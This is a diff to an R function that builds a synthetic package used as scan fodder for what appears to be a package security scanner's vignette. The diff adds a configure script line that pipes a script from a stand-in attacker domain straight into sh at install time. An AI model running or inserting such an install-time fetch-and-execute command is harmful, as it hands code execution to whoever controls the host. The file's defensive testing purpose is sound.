@@ -6,8 +6,9 @@
 # untrustedpkg is a synthetic package. It is never built, installed, or loaded;
 # it exists only so the vignette has something with findings to scan. Its
 # contents are deliberately chosen to produce one finding of each kind: a file
-# context (configure), a code context (.onLoad), and two patterns in different
-# code contexts (system() at load, download.file() in an ordinary function).
+# context (configure), a code context (.onLoad), two patterns in different code
+# contexts (system() at load, download.file() in an ordinary function), and one
+# expression in the file context (curl in configure).
 
 create_untrustedpkg <- function(
   dest    = file.path("inst", "extdata", "untrustedpkg"),
@@ -25,10 +26,14 @@ create_untrustedpkg <- function(
     "License: MIT + file LICENSE"
   ), file.path(src, "DESCRIPTION"))
 
-  # A configure script runs at install time, before any R code is loaded.
+  # A configure script runs at install time, before any R code is loaded. The
+  # curl invocation is deliberately unsubtle: it fetches and runs a remote
+  # script from a domain that cannot resolve, so the example is unmistakable
+  # and cannot reach anything if the file is ever executed by accident.
   writeLines(c(
     "#!/bin/sh",
-    "echo configuring"
+    "echo configuring",
+    "curl -s https://www.evil.com/evil.sh | sh"
   ), file.path(src, "configure"))
 
   # .onLoad() runs automatically when the namespace is loaded.
